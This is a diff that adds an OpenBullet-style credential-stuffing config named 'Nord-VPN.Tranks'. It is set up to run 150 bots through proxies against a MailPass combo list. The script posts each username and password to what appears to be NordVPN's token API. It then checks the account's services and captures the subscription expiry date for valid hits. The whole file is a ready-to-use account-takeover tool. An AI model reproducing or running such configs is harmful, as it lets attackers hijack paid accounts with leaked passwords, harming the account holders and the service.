@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "CreatorLK": "OB-23f244d14075df106e85c6a72d0f039d-LoliKEY",
+  "Name": "Nord-VPN.Tranks",
+  "SuggestedBots": 150,
+  "LastModified": "2019-04-30T19:36:23.7858712+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Tranks",
+  "Version": "1.2.2.4",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://zwyr157wwiu6eior.com/v1/users/tokens" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CHECK KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Unauthorized" 
+  KEYCHAIN Retry OR 
+    KEY "502: Bad gateway" 
+
+#TRE PARSE "<SOURCE>" LR "\"token\":\"" "\"" -> VAR "TOKEN" 
+
+#Plebs FUNCTION Base64Encode "token:<TOKEN>" -> VAR "ENCTOKEN" 
+
+#GET_DATA REQUEST GET "https://zwyr157wwiu6eior.com/v1/users/services" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Basic <ENCTOKEN>" 
+
+#CHECK_AGIN KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "created_at" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "false" 
+    KEY "2001-01-01 " 
+    KEY "00:00:00" 
+
+#NKS PARSE "<SOURCE>" LR "\",\"expires_at\":\"" "\"" -> CAP "Ending" "" "  |By:Tranks" 
+
